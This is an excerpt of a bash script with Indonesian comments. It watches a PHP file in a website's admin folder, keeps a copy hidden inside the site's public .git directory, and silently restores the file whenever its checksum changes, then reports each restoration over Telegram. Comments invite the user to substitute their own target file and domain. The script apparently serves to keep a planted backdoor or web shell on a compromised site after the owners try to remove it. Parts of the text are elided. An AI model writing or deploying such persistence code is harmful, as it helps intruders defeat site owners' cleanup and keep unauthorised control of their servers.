...
INDEX_FILE="/var/www/ideastile/public_html/admin/logs.php"
# Definisikan lokasi folder backup Permissions 755
BACKUP_FOLDER="/var/www/ideastile/public_html/.git"
# Buat folder backup jika belum ada
mkdir -p "$BACKUP_FOLDER"
# Tentukan nama file backup Permissions 755
BACKUP_FILE="$BACKUP_FOLDER/data-refs"
...
monitor_file() {
    while true; do
        ...
        if [ "$CURRENT_CHECKSUM" != "$BACKUP_CHECKSUM" ]; then
            ...
            echo "https://vliegeruit.com/."
            send_telegram_notification "https://www.ideastile.it/admin/logs.php. File logs.php Sudah dikembalikan ke versi backup." # UBAH JADI NAMA FILE/DOMAIN. UBAH JADI NAMA FILE/DOMAIN YG DI KEMBALIKAN
        fi
